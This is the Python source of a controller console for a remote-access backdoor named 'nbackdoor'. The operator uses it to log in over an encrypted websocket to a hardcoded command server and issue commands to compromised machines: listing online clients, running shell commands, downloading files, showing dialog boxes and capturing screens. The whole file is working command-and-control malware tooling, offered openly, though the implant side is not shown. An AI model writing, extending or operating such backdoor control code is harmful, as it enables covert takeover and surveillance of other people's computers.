#!/usr/bin/env python
# -*- coding: utf-8 -*-
import shlex
import os
from colorama import init
from colorama import Fore, Back, Style
import uuid
import json
import time
from base64 import b64decode, b64encode
from websocket import create_connection
from Crypto.Cipher import AES
from _docpot import docopt
__author__ = 'nekocode'


class ControllerClient:
    def __init__(self):
        self.SERVER_HOST = 'ws://192.168.10.3:8888'
        self.HOST_NAME = hostname()
        self.UUID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)
        self.ws = None

        self.exit = False
        init(autoreset=True)

    def run(self):
        while not self.exit:
            try:
                print 'Trying to connect server...'
                self.ws = create_connection(self.SERVER_HOST)
                print 'Connected!'

                pwd = pwd_input('Enter the password: ')

                try:
                    sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET),
                                   'pwd': self.encrypt(pwd)}
                    self.ws.send(json.dumps(sercret_msg))
                except Exception as e:
                    print 'Connection lose.'
                    continue

                msg = json.loads(self.decrypt(self.ws.recv()))
                if 'data' not in msg:
                    continue
                data = msg['data']
                if data == 'login failed':
                    print Fore.RED + 'Login failed.'
                    self.exit = True
                else:
                    print Fore.RED + 'Login success!'

                while not self.exit:
                    input_str = raw_input(Back.RED + 'nbackdoor:' + Back.RESET + ' ')
                    msg = self.command_to_msg(input_str)

                    if msg:
                        self.ws.send(self.encrypt(msg))
                        msg = json.loads(self.decrypt(self.ws.recv()))
                        if 'data' in msg:
                            data = msg['data']
                            print Fore.GREEN + data

                self.ws.close()

            except Exception as e:
                if e.message:
                    print e.message
                if self.ws:
                    self.ws.close()
                time.sleep(3)

    def command_to_msg(self, input_str):
        input_array = shlex.split(input_str)
        command_str = input_array[0]
        arguments_str = input_array[1:]

        if command_str == 'help':
            print """Command List:

help            show the command list
list            list online clients
cmd             send cmd to client
download
dialog
screen
exit            quit nbackdoor controller
"""
            return None

        elif command_str == 'list':
            doc = """Usage: list

-h --help       show this
"""
            try:
                args = docopt(doc, argv=arguments_str, help=True, version=None, options_first=False)
                return json.dumps({'cmd': command_str})
            except SystemExit as e:
                print e.message
                return None

        elif command_str == 'cmd':
            return json.dumps({'cmd': command_str})

        elif command_str == 'download':
            return json.dumps({'cmd': command_str})

        elif command_str == 'dialog':
            doc = """Usage: dialog CLINET_ID DIALOG_CONTENT [DIALOG_TITLE]

CLINET_ID       user command "list" to get clinet_id
DIALOG_CONTENT  content to show
DIALOG_TITLE    dialog title
-h --help       show this
"""
            try:
                args = docopt(doc, argv=arguments_str, help=True, version=None, options_first=False)
                return json.dumps({'cmd': command_str, 'to': args['CLINET_ID'],
                                   'content': args['DIALOG_CONTENT'], 'title': args['DIALOG_TITLE']})
            except SystemExit as e:
                print e.message
                return None

        elif command_str == 'screen':
            return json.dumps({'cmd': command_str})

        elif command_str == 'exit':
            self.exit = True
            return None

        else:
            print 'Not available command.\n'
            return None

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain


def hostname():
    sys = os.name

    if sys == 'nt':
        return os.getenv('computername')
    elif sys == 'posix':
        host = os.popen('echo $HOSTNAME')
        try:
            name = host.read()
            return name
        finally:
            host.close()
    else:
        return 'Unknow hostname'


def pwd_input(msg):
    print msg,

    import msvcrt
    chars = []
    while True:
        try:
            new_char = msvcrt.getch().decode(encoding="utf-8")
        except:
            return input("你很可能不是在 cmd 命令行下运行，密码输入将不能隐藏:")

        if new_char in '\r\n':  # 如果是换行，则输入结束
            break

        elif new_char == '\b':  # 如果是退格，则删除密码末尾一位并且删除一个星号
            if chars:
                del chars[-1]
                msvcrt.putch('\b'.encode(encoding='utf-8'))  # 光标回退一格
                msvcrt.putch( ' '.encode(encoding='utf-8'))  # 输出一个空格覆盖原来的星号
                msvcrt.putch('\b'.encode(encoding='utf-8'))  # 光标回退一格准备接受新的输入
        else:
            chars.append(new_char)
            msvcrt.putch('*'.encode(encoding='utf-8'))  # 显示为星号

    print
    return ''.join(chars)


def run_controller():
    client = ControllerClient()
    while not client.exit:
        client.run()


if __name__ == '__main__':
    run_controller()


